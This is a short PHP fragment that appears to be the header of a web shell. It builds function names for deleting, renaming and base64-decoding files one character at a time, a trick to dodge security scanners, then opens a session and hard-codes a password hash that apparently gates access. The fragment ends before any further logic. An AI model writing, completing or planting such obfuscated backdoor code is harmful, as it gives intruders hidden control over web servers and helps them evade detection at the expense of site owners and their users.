$htm  = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$unl  = "u"."n"."l"."i"."n"."k";
$rnm  = "r"."e"."n"."a"."m"."e";
$drnm = "d"."i"."r"."n"."a"."m"."e";
$bs   = "b"."a"."s"."e"."n"."a"."m"."e";
$be   = "b"."a"."s"."e"."6"."4"."_"."e"."n"."c"."o"."d"."e";
$bd   = "b"."a"."s"."e"."6"."4"."_"."d"."e"."c"."o"."d"."e";
$chd  = "c"."h"."d"."i"."r";
$tch  = "t"."o"."u"."c"."h";

session_start();
$pw='97b9de9429b8f223a44f3773ccbb06ce6fb9c6c03ea868b36a6776e47baef652';
